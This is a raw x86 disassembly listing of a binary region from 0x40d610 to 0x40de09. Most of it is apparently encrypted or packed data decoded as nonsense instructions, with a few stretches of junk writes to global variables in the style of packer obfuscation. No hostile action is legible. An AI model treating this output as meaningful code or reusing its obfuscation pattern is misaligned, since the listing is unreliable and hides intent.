  40d610:	and    esp,DWORD PTR [edi-0x35]
  40d613:	pop    edi
  40d614:	or     DWORD PTR [ebx-0x5a],ebp
  40d617:	cdq    
  40d618:	pop    ss
  40d619:	xchg   DWORD PTR [edi+0x6e7727e6],ecx
  40d61f:	les    ebx,FWORD PTR [eax+0x49d71957]
  40d625:	sub    BYTE PTR [eax+0x492b2f73],dl
  40d62b:	mov    bh,0x2c
  40d62d:	sbb    esi,DWORD PTR [esi+0x49fe1bdb]
  40d633:	jmp    0xbe0733e3
  40d638:	push   ss
  40d639:	cmp    al,BYTE PTR [ebx]
  40d63b:	push   ebx
  40d63c:	mov    al,0x53
  40d63e:	rcr    BYTE PTR ds:0x4492114f,0xf
  40d645:	fstp   DWORD PTR [edi+0x24fa45bf]
  40d64b:	int    0x51
  40d64d:	popf   
  40d64e:	in     eax,0xe8
  40d650:	mov    esp,0x6bb8a211
  40d655:	xor    al,0x35
  40d657:	ja     0x40d6b7
  40d659:	adc    DWORD PTR [ebp-0x28caee02],ebx
  40d65f:	sbb    ecx,edx
  40d661:	xchg   BYTE PTR [ebx+0x4567897b],bh
  40d667:	sub    cl,bh
  40d669:	cs pop esi
  40d66b:	add    ah,dl
  40d66d:	mov    DWORD PTR [esi-0x7d383a17],ebx
  40d673:	mov    al,0x18
  40d675:	sbb    dh,BYTE PTR [edx]
  40d677:	jmp    0x40d650
  40d679:	sbb    BYTE PTR [eax],ch
  40d67b:	mov    edi,0x1a371fc9
  40d680:	leave  
  40d681:	add    ecx,ebx
  40d683:	cli    
  40d684:	cdq    
  40d685:	pop    esp
  40d686:	xchg   esp,eax
  40d687:	in     eax,0xfd
  40d689:	stc    
  40d68a:	sub    BYTE PTR [edi+esi*1],dl
  40d68d:	adc    al,0x12
  40d68f:	fld    QWORD PTR [edi+esi*2-0x2d]
  40d693:	cmp    al,0xc1
  40d695:	and    BYTE PTR [esi-0x56],ah
  40d698:	mov    WORD PTR [edi+0x1123eebd],?
  40d69e:	int    0xa3
  40d6a0:	loop   0x40d662
  40d6a2:	inc    ebx
  40d6a3:	ins    DWORD PTR es:[edi],dx
  40d6a4:	dec    esi
  40d6a5:	pop    ecx
  40d6a6:	mov    al,ds:0x19cc66f
  40d6ab:	xacquire xchg DWORD PTR [edx],esp
  40d6ae:	repnz push eax
  40d6b0:	pop    ebx
  40d6b1:	dec    edx
  40d6b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6b3:	xor    al,BYTE PTR [eax]
  40d6b5:	ret    
  40d6b6:	aaa    
  40d6b7:	and    ebx,eax
  40d6b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ba:	sub    al,0x71
  40d6bc:	out    0x9c,al
  40d6be:	inc    esi
  40d6bf:	pop    edi
  40d6c0:	sub    eax,0xe8020551
  40d6c5:	cmp    BYTE PTR [ebx-0x12d67279],cl
  40d6cb:	loop   0x40d73e
  40d6cd:	xchg   bl,dh
  40d6cf:	dec    eax
  40d6d0:	push   edx
  40d6d1:	xchg   ebp,eax
  40d6d2:	pop    es
  40d6d3:	sub    dh,bh
  40d6d5:	js     0x40d70e
  40d6d7:	add    dh,BYTE PTR [edx]
  40d6d9:	jp     0x40d6f9
  40d6db:	sbb    eax,0x9d7f983c
  40d6e0:	adc    BYTE PTR [eax],al
  40d6e2:	lods   al,BYTE PTR ds:[esi]
  40d6e3:	fs and eax,0x185c0cae
  40d6e9:	stc    
  40d6ea:	pusha  
  40d6eb:	pop    ds
  40d6ec:	jl     0x40d673
  40d6ee:	sub    al,BYTE PTR [eax]
  40d6f0:	sub    BYTE PTR [esi],0x1b
  40d6f3:	jp     0x40d6ce
  40d6f5:	stos   DWORD PTR es:[edi],eax
  40d6f6:	lods   al,BYTE PTR ds:[esi]
  40d6f7:	xchg   esi,eax
  40d6f8:	test   al,0xe0
  40d6fa:	xchg   ebp,eax
  40d6fb:	inc    eax
  40d6fc:	mov    WORD PTR [ebx],ds
  40d6fe:	icebp  
  40d6ff:	sub    eax,0xb55fc383
  40d704:	jmp    DWORD PTR ds:0x2543ac87
  40d70a:	je     0x40d6e3
  40d70c:	inc    ebp
  40d70d:	dec    esi
  40d70e:	pop    ebp
  40d70f:	xchg   esi,eax
  40d710:	in     al,0x92
  40d712:	or     DWORD PTR [edx+ecx*1],esi
  40d715:	or     dl,BYTE PTR [esi]
  40d717:	sub    al,0xab
  40d719:	int    0xb8
  40d71b:	or     BYTE PTR [ecx],al
  40d71d:	outs   dx,BYTE PTR ds:[esi]
  40d71e:	cmp    bh,bh
  40d720:	jo     0x40d6a7
  40d722:	sbb    eax,DWORD PTR [eax-0x55]
  40d725:	loop   0x40d6c0
  40d727:	add    BYTE PTR [ebx],al
  40d729:	hlt    
  40d72a:	dec    eax
  40d72b:	jge    0x40d796
  40d72d:	scas   al,BYTE PTR es:[edi]
  40d72e:	(bad)
  40d733:	xchg   edx,eax
  40d734:	xor    BYTE PTR [eax],cl
  40d736:	mov    ds:0x13537dc,al
  40d73b:	and    dh,bl
  40d73d:	dec    esp
  40d73e:	(bad)  
  40d73f:	jno    0x40d72a
  40d741:	xchg   ebx,eax
  40d742:	mov    ds:0x297ee149,eax
  40d747:	retf   
  40d748:	pop    ebx
  40d749:	(bad)  
  40d74a:	fimul  DWORD PTR [edi]
  40d74c:	das    
  40d74d:	(bad)  
  40d74e:	adc    al,0xe7
  40d750:	cmp    edi,DWORD PTR [edx+0x6f]
  40d753:	stos   DWORD PTR es:[edi],eax
  40d754:	push   edx
  40d755:	mov    ds:0x8c4c541f,eax
  40d75a:	xor    DWORD PTR [edx+eax*1+0x7f83cd37],edx
  40d761:	jmp    0x40d783
  40d763:	cmp    eax,0xcaa5c242
  40d768:	fmul   DWORD PTR [ebp+0x1f]
  40d76b:	push   0xffffffc4
  40d76d:	mov    dl,0x36
  40d76f:	int    0xc9
  40d771:	(bad)
  40d775:	in     eax,0x20
  40d777:	and    al,dh
  40d779:	pop    edx
  40d77a:	pusha  
  40d77b:	cld    
  40d77c:	jb     0x40d72c
  40d77e:	jnp    0x40d725
  40d780:	fsub   QWORD PTR [ebx-0x60]
  40d783:	sbb    ebp,DWORD PTR [esi-0xd]
  40d786:	mov    edx,ds
  40d788:	adc    esp,DWORD PTR [edx-0x76e30bb8]
  40d78e:	cmp    ch,BYTE PTR [edi+0x6f3912aa]
  40d794:	xchg   ebp,eax
  40d795:	sub    eax,0x89a4f56
  40d79a:	pusha  
  40d79b:	push   esi
  40d79c:	clc    
  40d79d:	or     esp,DWORD PTR [edx-0x645b0c60]
  40d7a3:	jbe    0x40d73d
  40d7a5:	sub    eax,0x36769e0e
  40d7aa:	push   0x21e27877
  40d7af:	std    
  40d7b0:	js     0x40d821
  40d7b2:	imul   edx,esi,0x1c
  40d7b5:	add    eax,0x48678b91
  40d7ba:	fcmovnb st,st(2)
  40d7bc:	cmp    edi,0x33c
  40d7c2:	mov    DWORD PTR ds:0x42a7bd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7c5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi-0x17751ba3]
  40d7eb:	in     eax,dx
  40d7ec:	mov    esi,0x7878a959
  40d7f1:	xor    eax,0xcf78787e
  40d7f6:	imul   ebp,DWORD PTR [edx+0x256f86ed],0x96e67058
  40d800:	inc    edi
  40d801:	mov    bl,0x30
  40d803:	fstsw  WORD PTR [esi+ecx*1-0x17]
  40d808:	int    0x9
  40d80a:	jns    0x40d81d
  40d80c:	push   ecx
  40d80d:	dec    esp
  40d80e:	push   edi
  40d80f:	jns    0x40d885
  40d811:	dec    esi
  40d812:	dec    ebx
  40d813:	sbb    BYTE PTR [ebx+edi*1-0x68],bh
  40d817:	mov    bl,0xfe
  40d819:	iret   
  40d81a:	inc    eax
  40d81b:	inc    ebx
  40d81c:	jmp    0x6500:0xcee8f1c5
  40d823:	inc    DWORD PTR ds:0xb2c0a7c0
  40d829:	je     0x40d821
  40d82b:	js     0x40d7fc
  40d82d:	pop    edi
  40d82e:	nop
  40d82f:	scas   eax,DWORD PTR es:[edi]
  40d830:	xchg   esi,eax
  40d831:	leave  
  40d832:	mov    edi,0x7af0ddcb
  40d837:	jb     0x40d7c8
  40d839:	jnp    0x40d861
  40d83b:	xchg   ebx,eax
  40d83c:	nop
  40d83d:	dec    ebp
  40d83e:	jmp    0x40d7c3
  40d840:	dec    esp
  40d841:	jmp    0x73051274
  40d846:	jg     0x40d86c
  40d848:	addr16 (bad) 
  40d84a:	dec    esi
  40d84b:	inc    eax
  40d84c:	loopne 0x40d8bc
  40d84e:	shl    DWORD PTR [edx+eiz*2-0x5d],cl
  40d852:	in     al,dx
  40d853:	mov    bl,0xb6
  40d855:	xchg   ecx,eax
  40d856:	jge    0x40d7de
  40d858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d859:	push   ds
  40d85a:	mov    WORD PTR [edi-0xd],es
  40d85d:	lock cld 
  40d85f:	icebp  
  40d860:	jno    0x40d7f6
  40d862:	and    DWORD PTR [ebp+0x25222170],eax
  40d868:	popf   
  40d869:	xlat   BYTE PTR ds:[ebx]
  40d86a:	cld    
  40d86b:	push   0x52
  40d86d:	repz push esp
  40d86f:	popf   
  40d870:	mov    es,WORD PTR ds:0xebae9684
  40d876:	add    al,ch
  40d878:	rcr    BYTE PTR [eax+0x7d],1
  40d87b:	rol    BYTE PTR [eax+0x5],0xb0
  40d87f:	xor    al,0x24
  40d881:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40d883:	cdq    
  40d884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d885:	call   0x31d9:0xc20ef1a5
  40d88c:	sbb    al,0xe3
  40d88e:	or     eax,DWORD PTR [edx+0x76d0cb7f]
  40d894:	push   esi
  40d895:	les    ecx,FWORD PTR [eax-0x191a969]
  40d89b:	fs dec edx
  40d89d:	xchg   dl,ah
  40d89f:	jo     0x40d88a
  40d8a1:	jmp    0xc463:0xa56e
  40d8a7:	mov    ebx,0x85029e36
  40d8ac:	adc    bh,BYTE PTR [ecx]
  40d8ae:	mov    DWORD PTR [ebp+0x2dab9dd6],ebx
  40d8b4:	hlt    
  40d8b5:	add    ebp,DWORD PTR [eax-0x6]
  40d8b8:	jo     0x40d866
  40d8ba:	test   al,0x68
  40d8bc:	pop    edx
  40d8bd:	sti    
  40d8be:	es out 0x5c,eax
  40d8c1:	clc    
  40d8c2:	sub    ah,BYTE PTR [ebx]
  40d8c4:	adc    al,0x49
  40d8c6:	xlat   BYTE PTR ds:[ebx]
  40d8c7:	mov    esi,0x93a3353b
  40d8cc:	mov    DWORD PTR [edi+0x52],ebp
  40d8cf:	adc    DWORD PTR [ecx-0x4cd26648],edx
  40d8d5:	mov    ebx,0x62dadcc8
  40d8da:	cmp    DWORD PTR [esi],0x743a2de2
  40d8e0:	and    al,0x46
  40d8e2:	or     bl,BYTE PTR [ebx]
  40d8e4:	xchg   edx,eax
  40d8e5:	cs popa 
  40d8e7:	push   ss
  40d8e8:	pop    ds
  40d8e9:	daa    
  40d8ea:	or     dh,dh
  40d8ec:	xor    ah,cl
  40d8ee:	out    dx,eax
  40d8ef:	cmp    bh,BYTE PTR [esi]
  40d8f1:	adc    esi,DWORD PTR [esi+0x5f]
  40d8f4:	inc    esp
  40d8f5:	and    eax,0xa4bb124f
  40d8fa:	call   0x7907:0x5574277e
  40d901:	adc    ah,BYTE PTR [ecx]
  40d903:	inc    edi
  40d904:	fnstcw WORD PTR [eax-0x3e267fbd]
  40d90a:	mov    eax,0x74b77506
  40d90f:	rcl    BYTE PTR [ecx+0x29],1
  40d912:	paddw  mm6,QWORD PTR [edx-0xa]
  40d916:	fldenv [edi+0x7d]
  40d919:	into   
  40d91a:	push   ds
  40d91b:	pop    ds
  40d91c:	mov    edx,0xf4cdf446
  40d921:	mov    ds:0xc44d4de5,al
  40d926:	rcl    DWORD PTR [edx+0x5be7fefd],1
  40d92c:	lods   al,BYTE PTR ds:[esi]
  40d92d:	dec    ebp
  40d92e:	jmp    0xc5235a4d
  40d933:	ja     0x40d904
  40d935:	lahf   
  40d936:	xor    esp,esi
  40d938:	jae    0x40d964
  40d93a:	ins    BYTE PTR es:[edi],dx
  40d93b:	xchg   ebp,eax
  40d93c:	or     al,0xfd
  40d93e:	call   0xb05b:0x210d3e6b
  40d945:	das    
  40d946:	(bad)  
  40d947:	bnd jg 0x40d929
  40d94a:	jp     0x40d94f
  40d94c:	jp     0x40d982
  40d94e:	rcl    esp,cl
  40d950:	(bad)  
  40d952:	mov    al,ds:0xb6c38372
  40d957:	adc    DWORD PTR [edi-0x58],esp
  40d95a:	imul   eax,eax,0x2e
  40d95d:	fbstp  TBYTE PTR [ecx-0x36]
  40d960:	pop    edi
  40d961:	shl    DWORD PTR [ecx+0x23],1
  40d964:	fnsave [ecx]
  40d966:	jl     0x40d963
  40d968:	leave  
  40d969:	adc    eax,DWORD PTR [ebp+0x60784494]
  40d96f:	mov    bh,0x31
  40d971:	ficom  WORD PTR [ebx]
  40d973:	jbe    0x40d960
  40d975:	sar    ah,cl
  40d977:	pop    ds
  40d978:	(bad)
  40d97c:	pop    esi
  40d97d:	xor    BYTE PTR [edx-0x2849559d],bh
  40d983:	call   0x9196:0xc0cc24c7
  40d98a:	xor    DWORD PTR [ecx-0x4b12fca7],0x1651afb4
  40d994:	push   es
  40d995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d996:	push   eax
  40d997:	test   esp,esi
  40d999:	and    ecx,DWORD PTR [ecx+0x4]
  40d99c:	dec    eax
  40d99d:	sbb    ebx,DWORD PTR [eax]
  40d99f:	(bad)  
  40d9a0:	out    dx,al
  40d9a1:	push   ss
  40d9a2:	or     DWORD PTR [ebp-0x50320653],esp
  40d9a8:	leave  
  40d9a9:	and    al,dh
  40d9ab:	test   al,0x0
  40d9ad:	sub    DWORD PTR [edi-0x60],0xffffffb4
  40d9b1:	daa    
  40d9b2:	sub    eax,0x29a9718d
  40d9b7:	jno    0x40da00
  40d9b9:	or     esi,DWORD PTR [ecx-0x48]
  40d9bc:	(bad)  
  40d9bd:	cmp    dl,BYTE PTR [edi-0x73]
  40d9c0:	xor    al,0xa5
  40d9c2:	push   ebp
  40d9c3:	mov    ch,BYTE PTR [eax-0x32940d4b]
  40d9c9:	jl     0x40da29
  40d9cb:	jae    0x40d965
  40d9cd:	cmp    BYTE PTR [esi],dh
  40d9cf:	and    ch,ah
  40d9d1:	inc    edi
  40d9d2:	add    al,0x13
  40d9d4:	int3   
  40d9d5:	push   ss
  40d9d6:	pop    esi
  40d9d7:	sub    BYTE PTR [esi+0x1cfadf71],ah
  40d9dd:	sub    ch,cl
  40d9df:	jo     0x40da0e
  40d9e1:	xorps  xmm5,XMMWORD PTR [ecx]
  40d9e4:	xchg   edi,eax
  40d9e5:	aaa    
  40d9e6:	inc    edx
  40d9e7:	adc    BYTE PTR [eax+0x650ac784],ah
  40d9ed:	mov    ebp,0xadeec7e5
  40d9f2:	push   0xffffffff
  40d9f4:	sub    ch,bl
  40d9f6:	sub    DWORD PTR [ebx+0x34],edx
  40d9f9:	arpl   bx,sp
  40d9fb:	dec    edx
  40d9fc:	sahf   
  40d9fd:	imul   ecx,DWORD PTR [edi-0x601f4f71],0xb2df4310
  40da07:	rcr    BYTE PTR [edx+eiz*1],1
  40da0a:	loopne 0x40d9ef
  40da0c:	call   0x13272a88
  40da11:	ins    BYTE PTR es:[edi],dx
  40da12:	push   esi
  40da13:	lahf   
  40da14:	push   esp
  40da15:	jo     0x40d9bd
  40da17:	adc    eax,0x3779a271
  40da1c:	add    eax,0x32fd174f
  40da21:	int3   
  40da22:	pushf  
  40da23:	dec    esp
  40da24:	outs   dx,DWORD PTR ds:[esi]
  40da25:	cmp    al,0xe6
  40da27:	push   ss
  40da28:	lea    ecx,[ebp+0x28804d02]
  40da2e:	test   eax,0x86583b7
  40da33:	add    BYTE PTR [ecx+0x42a831],ah
  40da39:	sbb    eax,DWORD PTR ds:0x42a809
  40da3f:	mov    ds:0x42a831,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a7f1,0x42a7bd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a801,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a771,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	psubusb mm0,QWORD PTR [esi+0x78ae169f]
  40da84:	js     0x40dabb
  40da86:	jle    0x40db00
  40da88:	js     0x40da39
  40da8a:	sub    al,0x6
  40da8c:	test   eax,0x770d17f7
  40da91:	adc    al,0xd2
  40da93:	das    
  40da94:	gs scas al,BYTE PTR es:[edi]
  40da96:	xchg   ebp,eax
  40da97:	or     bl,BYTE PTR [edi]
  40da99:	cld    
  40da9a:	fidivr WORD PTR [eax-0x222f99ef]
  40daa0:	jecxz  0x40da83
  40daa2:	jmp    0x337:0x98cca105
  40daa9:	dec    ebp
  40daaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daab:	sahf   
  40daac:	je     0x40db0a
  40daae:	jae    0x40da3a
  40dab0:	imul   esp,DWORD PTR [edi+eax*1],0x8a40e93
  40dab7:	sub    cl,BYTE PTR [eax]
  40dab9:	inc    ecx
  40daba:	jl     0x40dabe
  40dabc:	imul   ecx,DWORD PTR [ecx],0x34
  40dabf:	mov    bh,0xcf
  40dac1:	and    DWORD PTR [edi+edx*8],0xf52a0e6a
  40dac8:	imul   ecx,DWORD PTR [edx-0x33f03cef],0x502706d2
  40dad2:	jb     0x40dae7
  40dad4:	sub    eax,0x7cfdfe16
  40dad9:	pop    ebp
  40dada:	data16 cmp BYTE PTR [ebx+0x30],0x44
  40dadf:	add    al,0xc6
  40dae1:	pop    edi
  40dae2:	daa    
  40dae3:	ficom  WORD PTR [esi-0x1e7e46da]
  40dae9:	out    dx,al
  40daea:	push   esi
  40daeb:	mov    dl,0x9a
  40daed:	mov    edi,?
  40daef:	fdivr  DWORD PTR [edx+eiz*8+0x66]
  40daf3:	fbld   TBYTE PTR [esi+0x67]
  40daf6:	adc    dh,BYTE PTR [esi-0x348139d6]
  40dafc:	sahf   
  40dafd:	retf   
  40dafe:	dec    edx
  40daff:	sub    BYTE PTR [edx+0x69],dl
  40db02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db03:	out    dx,al
  40db04:	mov    ebx,0xe284b2a2
  40db09:	neg    DWORD PTR [edi-0x4dce2c1a]
  40db0f:	push   ecx
  40db10:	out    dx,eax
  40db11:	outs   dx,BYTE PTR ds:[esi]
  40db12:	mov    ch,BYTE PTR [ebx+eax*8+0x2ddf2084]
  40db19:	adc    DWORD PTR [eax],0x5259343d
  40db1f:	xchg   ecx,eax
  40db20:	add    ah,BYTE PTR [ebx-0x46]
  40db23:	adc    esp,ebp
  40db25:	mov    ah,0xba
  40db27:	mov    al,ds:0x1ff80a83
  40db2c:	jge    0x40db23
  40db2e:	jbe    0x40db14
  40db30:	(bad)  
  40db31:	push   esp
  40db32:	test   BYTE PTR [esi-0x3f],bl
  40db35:	cmp    al,0xbe
  40db37:	xor    ah,ch
  40db39:	push   ecx
  40db3a:	das    
  40db3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db3c:	repz into 
  40db3e:	push   0x71941183
  40db43:	mov    DWORD PTR [edx+eax*2+0x50],ecx
  40db47:	dec    eax
  40db48:	and    BYTE PTR [eax-0x36],0xf9
  40db4c:	inc    ecx
  40db4d:	pusha  
  40db4e:	jns    0x40dada
  40db50:	push   eax
  40db51:	xchg   ebx,eax
  40db52:	push   esp
  40db53:	pop    ebx
  40db54:	repnz adc ebp,ebx
  40db57:	mov    ecx,0x81fcc342
  40db5c:	inc    edi
  40db5d:	push   ebx
  40db5e:	loopne 0x40db0f
  40db60:	popf   
  40db61:	daa    
  40db62:	mov    cl,0xda
  40db64:	cmp    esp,esp
  40db66:	outs   dx,BYTE PTR ds:[esi]
  40db67:	or     eax,0x507076d9
  40db6c:	(bad)  [esi-0x637b2524]
  40db72:	xor    edi,edi
  40db74:	adc    ebx,DWORD PTR [edi-0x4b]
  40db77:	imul   esi,DWORD PTR [ecx-0x62],0x77
  40db7b:	push   ecx
  40db7c:	cdq    
  40db7d:	jmp    0xe17f:0x3dfcef62
  40db84:	adc    al,0x41
  40db86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db87:	mov    bh,0x7b
  40db89:	mov    eax,DWORD PTR [ebp-0x7a]
  40db8c:	int    0x57
  40db8e:	mov    ebx,0xd26feeea
  40db93:	call   0xefd9:0x5cb32e9d
  40db9a:	pop    esi
  40db9b:	retf   0x757b
  40db9e:	scas   al,BYTE PTR es:[edi]
  40db9f:	in     al,dx
  40dba0:	adc    ch,BYTE PTR [edi]
  40dba2:	mov    esp,0xdb904d0e
  40dba7:	out    dx,al
  40dba8:	std    
  40dba9:	xchg   ebp,eax
  40dbaa:	popf   
  40dbab:	scas   eax,DWORD PTR es:[edi]
  40dbac:	dec    edi
  40dbad:	repz or bl,BYTE PTR [edi-0x7ae7de74]
  40dbb4:	gs call 0xcdf8:0x3e924365
  40dbbc:	rcr    BYTE PTR [edi+0x13aca7b5],0x98
  40dbc3:	into   
  40dbc4:	dec    edi
  40dbc5:	cdq    
  40dbc6:	sar    BYTE PTR [esp+edx*8-0x3e],cl
  40dbca:	or     dh,BYTE PTR ds:0x31542321
  40dbd0:	call   0x6075:0xa9cdb58c
  40dbd7:	ror    edx,cl
  40dbd9:	loop   0x40dc56
  40dbdb:	pop    es
  40dbdc:	cld    
  40dbdd:	or     bl,BYTE PTR [edi-0x15]
  40dbe0:	popf   
  40dbe1:	push   edx
  40dbe2:	(bad)  
  40dbe3:	jb     0x40dbdc
  40dbe5:	push   0x41
  40dbe7:	sub    al,0x56
  40dbe9:	stos   DWORD PTR es:[edi],eax
  40dbea:	jb     0x40dbd9
  40dbec:	in     al,dx
  40dbed:	fstp   TBYTE PTR [ebx+0x68943288]
  40dbf3:	ror    ebp,cl
  40dbf5:	cmp    bl,BYTE PTR [eax+0x17]
  40dbf8:	mov    ebp,0x770ec83f
  40dbfd:	fmul   QWORD PTR [ebp-0x681fb2a9]
  40dc03:	sub    BYTE PTR [edx+edi*4+0x6d],al
  40dc07:	mov    ebp,0xa0a9f061
  40dc0c:	cmp    edi,DWORD PTR [edx]
  40dc0e:	cdq    
  40dc0f:	jo     0x40dc66
  40dc11:	pop    eax
  40dc12:	pop    edx
  40dc13:	into   
  40dc14:	ins    DWORD PTR es:[edi],dx
  40dc15:	out    0x51,eax
  40dc17:	(bad)  
  40dc18:	mov    esp,0xa4aa527f
  40dc1d:	inc    ebx
  40dc1e:	inc    bx
  40dc20:	sbb    ah,BYTE PTR [ebp-0x29]
  40dc23:	loope  0x40dc22
  40dc25:	shl    BYTE PTR [edi+0xe],0xe
  40dc29:	outs   dx,BYTE PTR ds:[esi]
  40dc2a:	push   esp
  40dc2b:	add    eax,0x9b489757
  40dc30:	daa    
  40dc31:	pop    esp
  40dc32:	xor    eax,0x9b8412cc
  40dc37:	mov    ecx,0x15011458
  40dc3c:	mov    ecx,0x13c7998c
  40dc41:	xchg   esp,eax
  40dc42:	jbe    0x40dc2c
  40dc44:	sub    bl,BYTE PTR [ebp+0x594f4330]
  40dc4a:	and    BYTE PTR [ebx+edx*1+0x2c],cl
  40dc4e:	and    eax,0xea53e3d3
  40dc53:	cmp    ch,BYTE PTR [edi-0x6e]
  40dc56:	mov    dh,BYTE PTR [edi-0x59]
  40dc59:	xor    DWORD PTR [ebp+edx*8+0x22baec0b],esi
  40dc60:	sahf   
  40dc61:	loopne 0x40dc10
  40dc63:	aam    0xec
  40dc65:	pop    es
  40dc66:	into   
  40dc67:	xchg   esp,eax
  40dc68:	fs or  eax,0xe92d9e07
  40dc6e:	data16 div BYTE PTR cs:[esi+0x1b72f1a]
  40dc76:	nop
  40dc77:	push   es
  40dc78:	jmp    FWORD PTR [ebp+0x3647a45f]
  40dc7e:	pop    eax
  40dc7f:	mov    ebx,0x8a7d191
  40dc84:	add    eax,0xd8b4dba6
  40dc89:	xchg   ebx,eax
  40dc8a:	lahf   
  40dc8b:	mov    al,0xda
  40dc8d:	out    0x6b,al
  40dc8f:	mov    ecx,0xe66fe84a
  40dc94:	mov    esi,0x67b33b33
  40dc99:	into   
  40dc9a:	inc    edx
  40dc9b:	mov    dh,BYTE PTR [edx+0x56267740]
  40dca1:	push   ds
  40dca2:	jle    0x40dc35
  40dca4:	addr16 retf 
  40dca6:	sahf   
  40dca7:	outs   dx,DWORD PTR ds:[esi]
  40dca8:	aaa    
  40dca9:	mov    cl,0x25
  40dcab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcac:	jbe    0x40dd03
  40dcae:	pop    esp
  40dcaf:	xor    ebp,DWORD PTR [ecx+0x726eaadc]
  40dcb5:	iret   
  40dcb6:	mov    WORD PTR [eax],gs
  40dcb8:	gs inc esi
  40dcba:	pushf  
  40dcbb:	outs   dx,BYTE PTR ds:[esi]
  40dcbc:	lock sbb DWORD PTR [eax-0x5f],0xb0aacd0d
  40dcc4:	add    eax,DWORD PTR [ebp+0x8]
  40dcc7:	add    DWORD PTR ds:0x42a881,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a75d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7b5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a831,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a83d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7b9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7b1
  40dd3d:	and    DWORD PTR ds:0x42a781,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a871,0x42a87d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	lds    eax,FWORD PTR [edx-0x532c0f14]
  40dd69:	js     0x40dde3
  40dd6b:	xor    eax,0x5678787e
  40dd70:	(bad)  
  40dd71:	jecxz  0x40dd01
  40dd73:	aad    0x5b
  40dd75:	sub    al,0xe6
  40dd77:	div    cl
  40dd79:	push   eax
  40dd7a:	xor    al,0xd2
  40dd7c:	imul   ebp,DWORD PTR [ebx-0x72c67b89],0x14a68f31
  40dd86:	jo     0x40dd25
  40dd88:	mov    ecx,0x7f28d20d
  40dd8d:	xor    ch,al
  40dd8f:	imul   esp,DWORD PTR [ecx+0x17b862d5],0xffffffff
  40dd96:	push   esp
  40dd97:	call   FWORD PTR [ecx+0x70640d4d]
  40dd9d:	lock repz fcmovb st,st(7)
  40dda1:	aam    0x4f
  40dda3:	mov    bh,0x5b
  40dda5:	cmp    eax,0x169d7354
  40ddaa:	outs   dx,DWORD PTR ds:[esi]
  40ddab:	mov    edi,0x8857a8bc
  40ddb0:	imul   eax,DWORD PTR [eax-0x55],0x6d
  40ddb4:	push   esi
  40ddb5:	adc    BYTE PTR [ebx-0x3d],al
  40ddb8:	jmp    0xbf8e:0x3de92892
  40ddbf:	(bad)  
  40ddc0:	xchg   edx,eax
  40ddc1:	out    0xae,al
  40ddc3:	xchg   esp,eax
  40ddc4:	cdq    
  40ddc5:	iret   
  40ddc6:	sub    esp,DWORD PTR [esi+0x59ef75e9]
  40ddcc:	int    0x21
  40ddce:	mov    eax,ds:0x6bf0110e
  40ddd3:	fisubr DWORD PTR [esi+0x69]
  40ddd6:	xor    al,0x48
  40ddd8:	fadd   QWORD PTR [eax-0x5c]
  40dddb:	leave  
  40dddc:	pop    ecx
  40dddd:	scas   al,BYTE PTR es:[edi]
  40ddde:	out    0xed,eax
  40dde0:	shl    DWORD PTR [edx+0x2365af84],0x39
  40dde7:	sub    cl,BYTE PTR [esi+edi*4-0x66]
  40ddeb:	pmaxsw mm6,QWORD PTR [edi+0x51]
  40ddef:	sub    al,0x42
  40ddf1:	cmp    DWORD PTR [edi+0x726e8ed3],ebp
  40ddf7:	pop    edx
  40ddf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddf9:	mov    bl,0x36
  40ddfb:	cmp    dh,al
  40ddfd:	mov    eax,ds:0x50a4019a
  40de02:	fucomip st,st(0)
  40de04:	es xchg ecx,eax
  40de06:	pop    eax
  40de07:	mov    bl,ah
  40de09:	rol    DWORD PTR [ebx],cl
